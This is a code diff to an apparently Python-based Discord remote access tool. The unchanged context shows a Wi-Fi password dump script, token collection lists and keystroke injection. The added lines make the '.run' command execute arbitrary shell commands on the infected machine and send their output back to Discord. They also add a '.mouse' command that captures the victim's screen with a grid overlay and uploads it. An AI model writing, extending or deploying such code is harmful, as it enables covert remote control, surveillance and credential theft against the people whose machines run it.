@@ -19,6 +19,7 @@ from json import loads
 from re import findall
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
+from PIL import Image, ImageDraw #mouse grid image
 
 
 
@@ -28,6 +29,7 @@ wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=
 tokens = []
 cleaned = []
 checker = []
+
 
 
 def getip():
@@ -379,9 +381,13 @@ async def on_message(message):
                 await message.reply(embed=embed)
                 await message.delete()
             elif message.content.lower().startswith(".run"):
-                file = message.content[5:]
-                output = subprocess.Popen(file, shell=True)
-                embed = discord.Embed(title="Started", description=f"```{output}```", color=0xfafafa)
+                command = message.content[5:]
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='utf-8')
+                    embed = discord.Embed(title="Command Output", description=f"```{output}```", color=0xfafafa)
+                except subprocess.CalledProcessError as e:
+                    output = e.output
+                    embed = discord.Embed(title="Command Error", description=f"```{output}```", color=0xfafafa)
                 await message.reply(embed=embed)
                 await message.delete()
             elif message.content.lower().startswith(".cd"):
@@ -411,6 +417,35 @@ async def on_message(message):
                 except Exception as e:
                     await channel.send("Failed to send keystroke: " + hotkey + "\nError: " + str(e))
                     await message.delete()
+            elif message.content.lower().startswith(".mouse"):
+                command = message.content[7:]
+                if command.lower() == "large" or command.lower() == "l":
+                    grid_size = 100
+                elif command.lower() == "medium" or command.lower() == "m":
+                    grid_size = 75
+                elif command.lower() == "small" or command.lower() == "s":
+                    grid_size = 50
+                else: 
+                    message.channel.send("Invalid grid size.\n Valid values are: large, medium,  small")
+                screenshot = pyautogui.screenshot()
+                overlay = Image.new('RGBA', screenshot.size, (0, 0, 0, 0))
+                grid_color = (255, 0, 0, 128)  # Grid color and transparency
+                for x in range(0, screenshot.width, grid_size):
+                    for y in range(screenshot.height):
+                        overlay.putpixel((x, y), grid_color)
+                for y in range(0, screenshot.height, grid_size):
+                    for x in range(screenshot.width):
+                        overlay.putpixel((x, y), grid_color)
+                global gridresult
+                gridresult = Image.alpha_composite(screenshot.convert('RGBA'), overlay)
+                path = os.path.join(os.getenv("TEMP"), "finishedscreenshot.png")
+                gridresult.save(path)
+                file = discord.File(path)
+                embed = discord.Embed(title="Screenshot", color=0xfafafa)
+                embed.set_image(url="attachment://finishedscreenshot.png")
+                await channel.send(embed=embed, file=file) 
+                await message.delete()
+                
     else:
         print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)
 
